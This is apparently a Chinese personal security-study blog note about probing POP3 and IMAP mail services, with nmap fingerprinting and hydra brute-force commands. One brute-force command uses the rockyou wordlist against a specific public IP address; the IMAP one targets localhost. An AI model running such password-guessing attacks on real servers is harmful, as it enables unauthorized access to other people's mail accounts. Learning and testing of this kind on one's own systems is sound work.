ailx10说：这篇是我2023年6月写的。邮件服务这一章从 SMTP、ESMTP 的应答看起，再到 POP3、IMAP 的指纹和认证，我发现平时“邮箱能收信”背后其实分了几种不同的服务。跟着例子试本地 IMAP 时，第一次把结果跑通，才觉得这些命令不只是书里的输出。于是把查询和尝试都放进这篇，按协议分开看。它留下的是一次从日常邮箱功能走回通信接口的补课，熟悉的收发邮件，突然也变成了可以逐句观察的对话。

---

核查提示：本地案例成功不能推广外部服务器；明文端口只是一部分，TLS和认证策略需另读。 旧版内容与实验仍需逐项核验。

2、POP3 邮局协议版本3 监听TCP 110 端口

1）POP3指纹识别

```
nmap -Pn -sV 210.245.233.98 -p 110
```

![](/notes-assets/1e6dbfafb033c518b891.webp)

2）POP3暴力破解

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt pop3://210.245.233.98
```

![](/notes-assets/3cd663b86ef7e832dceb.webp)

3、IMAP 互联网消息访问协议 监听TCP 143端口

1）IMAP指纹识别

```
nmap -Pn -sV 127.0.0.1 -p 143
```

![](/notes-assets/6f275c1982f58cc8a84c.webp)

2）IMAP暴力破解（这是我第一次暴力破解成功，惊喜）

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt imap://127.0.0.1
```

![](/notes-assets/006b0c1e7ad35ed0de32.webp)

明文端口不能代表全部邮件服务，TLS和认证策略也不会自动相同。把本地结果与外部目标分开，才能知道一次成功可以借鉴到哪里。
